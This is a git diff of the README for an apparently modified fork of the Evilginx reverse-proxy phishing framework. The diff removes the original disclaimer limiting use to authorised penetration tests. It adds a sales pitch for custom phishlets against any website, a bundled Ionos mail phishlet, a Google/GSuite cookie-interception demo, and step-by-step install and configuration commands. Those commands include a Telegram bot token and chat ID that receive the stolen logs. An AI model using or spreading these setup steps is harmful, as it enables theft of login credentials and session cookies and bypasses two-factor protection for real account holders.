@@ -5,49 +5,90 @@
   </p>
 </p>
 
-# Evilginx 3.0
+# Evilginx 3.4.0 - Modified by @HosterMSG
+
+
+
+
+
+
+
+
+# NEW VERSION AVAILABLE
+https://github.com/EvilHoster/EvilGinx2-3.4.1-Modification
+# NEW VERSION
+
+
+
+
+
+# NEW VERSION AVAILABLE
+https://github.com/EvilHoster/EvilGinx2-3.4.1-Modification
+# NEW VERSION
+
+
+
+
+
+
+
+
+
+
+
+
+
+This modified version can send logs to your telegram group chat.
+Inside this modified version i have added free Ionos mail phishlet as proof of high quality product i have nothing to hide.
+Incase u want more phishlets let me know we can do any website u want without any upfront payments.
+https://t.me/HosterMSG
 
 **Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.
 
-This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
-Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.
 
-<p align="center">
-  <img alt="Screenshot" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png" height="320" />
-</p>
+This version Google / Gsuite Cookie Interception Template/Phishlet In Action.
+https://vimeo.com/931409763
 
-## Disclaimer
+Alternative video url:
+https://www.flexclip.com/editor/app?id=9e89b4e3509603d00d53064b8058bcd1
 
-I am very much aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks. Evilginx should be used only in legitimate penetration testing assignments with written permission from to-be-phished parties.
 
-## Evilginx Mastery Training Course
+How to install ?
 
-If you want everything about reverse proxy phishing with **Evilginx** - check out my [Evilginx Mastery](https://academy.breakdev.org/evilginx-mastery) course!
+On Ubuntu:
 
-<p align="center">
-  <a href="https://academy.breakdev.org/evilginx-mastery"><img alt="Evilginx Mastery" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx_mastery.jpg" height="320" /></a>
-</p>
+1. git clone https://github.com/EvilHoster/evilginx-3.4.0-telegram-modification
+2. cd evilginx-3.4.0-telegram-modification
+3. cd build
+4. chmod +rwx evilginx
+5. ./evilginx -p ../phishlets/
 
-Learn everything about the latest methods of phishing, using reverse proxying to bypass Multi-Factor Authentication. Learn to think like an attacker, during your red team engagements, and become the master of phishing with Evilginx.
+Setup your configuration.
 
-Grab it here:
-https://academy.breakdev.org/evilginx-mastery
+1. config domain something.com
+2. cofig ipv4 external serverip
+3. config ipv4 bind serverip
+4. config unauth_url https://bots.here.redirected.com/
+5. config autocert off/on
 
-## Write-ups
+[ if ON free certificates is used, it can rate-limit your domain if u ask too much. ]
+[ If OFF 
+- Feature: Added support to load custom TLS certificates from a public certificate file and a private key file stored in `~/.evilginx/crt/sites/<hostname>/`. Will load `fullchain.pem` and `privkey.pem` pair or a combination of a `.pem`/`.crt` (public certificate) and a `.key` (private key) file. Make sure to run without `-developer` flag and disable autocert retrieval with `config autocert off`.
+}
 
-If you want to learn more about reverse proxy phishing, I've published extensive blog posts about **Evilginx** here:
 
-[Evilginx 2.0 - Release](https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens)
+6.config webhook_telegram 7192062302:AAGvU9P57FF37gz-ZRUuonESXwvStiQV58Y/-15604540645
 
-[Evilginx 2.1 - First Update](https://breakdev.org/evilginx-2-1-the-first-post-release-update/)
+7192062302:AAGvU9P57FF37gz-ZRUuonESXwvStiQV58Y is a Token from Bot Father.
+-15604540645 is a Chat ID inside your group.
 
-[Evilginx 2.2 - Jolly Winter Update](https://breakdev.org/evilginx-2-2-jolly-winter-update/)
+Add to your Telegram group https://t.me/raw_data_bot and your Group Chat ID will be displayed.
 
-[Evilginx 2.3 - Phisherman's Dream](https://breakdev.org/evilginx-2-3-phishermans-dream/)
 
-[Evilginx 2.4 - Gone Phishing](https://breakdev.org/evilginx-2-4-gone-phishing/)
 
-[Evilginx 3.0](https://breakdev.org/evilginx-3-0-evilginx-mastery/)
+
+
+
 
 ## Help
 
@@ -55,10 +96,6 @@ In case you want to learn how to install and use **Evilginx**, please refer to o
 
 https://help.evilginx.com
 
-## Support
 
-I DO NOT offer support for providing or creating phishlets. I will also NOT help you with creation of your own phishlets. Please look for ready-to-use phishlets, provided by other people.
-
-## License
-
-**evilginx2** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)) and it's released under BSD-3 license.
+This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, but i did modification in 2024.04.02 which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
+Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.
